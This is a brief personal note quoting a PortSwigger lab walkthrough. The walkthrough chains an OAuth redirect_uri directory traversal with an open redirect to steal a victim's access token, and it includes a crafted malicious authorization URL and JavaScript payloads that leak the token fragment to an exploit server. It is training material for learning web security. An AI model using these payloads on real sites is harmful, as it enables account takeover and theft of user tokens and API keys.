will expand this, but we abuse CSRF and open redirect heavily.  


below is an interesting writeup from portswigger, will add more, maybe. 
```
While proxying traffic through Burp, click "My account" and complete the OAuth login process. Afterwards, you will be redirected back to the blog website.
Study the resulting requests and responses. Notice that the blog website makes an API call to the userinfo endpoint at /me and then uses the data it fetches to log the user in. Send the GET /me request to Burp Repeater.
Log out of your account and log back in again. From the proxy history, find the most recent GET /auth?client_id=[...] request and send it to Repeater.
In Repeater, experiment with the GET /auth?client_id=[...] request. Observe that you cannot supply an external domain as redirect_uri because it's being validated against a whitelist. However, you can append additional characters to the default value without encountering an error, including the /../ directory traversal sequence.
Log out of your account on the blog website and turn on proxy interception in Burp.
In your browser, log in again and go to the intercepted GET /auth?client_id=[...] request in Burp Proxy.
Confirm that the redirect_uri parameter is in fact vulnerable to directory traversal by changing it to:

https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post?postId=1
Forward any remaining requests and observe that you are eventually redirected to the first blog post. In your browser, notice that your access token is included in the URL as a fragment.

With the help of Burp, audit the other pages on the blog website. Identify the "Next post" option at the bottom of each blog post, which works by redirecting users to the path specified in a query parameter. Send the corresponding GET /post/next?path=[...] request to Repeater.
In Repeater, experiment with the path parameter. Notice that this is an open redirect. You can even supply an absolute URL to elicit a redirect to a completely different domain, for example, your exploit server.
Craft a malicious URL that combines these vulnerabilities. You need a URL that will initiate an OAuth flow with the redirect_uri pointing to the open redirect, which subsequently forwards the victim to your exploit server:

https://YOUR-LAB-OAUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit&response_type=token&nonce=399721827&scope=openid%20profile%20email
Test that this URL works correctly by visiting it in your browser. You should be redirected to the exploit server's "Hello, world!" page, along with the access token in a URL fragment.
On the exploit server, create a suitable script at /exploit that will extract the fragment and output it somewhere. For example, the following script will leak it via the access log by redirecting users to the exploit server for a second time, with the access token as a query parameter instead:

<script>
window.location = '/?'+document.location.hash.substr(1)
</script>
To test that everything is working correctly, store this exploit and visit your malicious URL again in your browser. Then, go to the exploit server access log. There should be a request for GET /?access_token=[...].
You now need to create an exploit that first forces the victim to visit your malicious URL and then executes the script you just tested to steal their access token. For example:

<script>
    if (!document.location.hash) {
        window.location = 'https://YOUR-LAB-AUTH-SERVER.web-security-academy.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.web-security-academy.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
To test that the exploit works, store it and then click "View exploit". The page should appear to refresh, but if you check the access log, you should see a new request for GET /?access_token=[...].
Deliver the exploit to the victim, then copy their access token from the log.
In Repeater, go to the GET /me request and replace the token in the Authorization: Bearer header with the one you just copied. Send the request. Observe that you have successfully made an API call to fetch the victim's data, including their API key.
Use the "Submit solution" button at the top of the lab page to submit the stolen key and solve the lab.
```
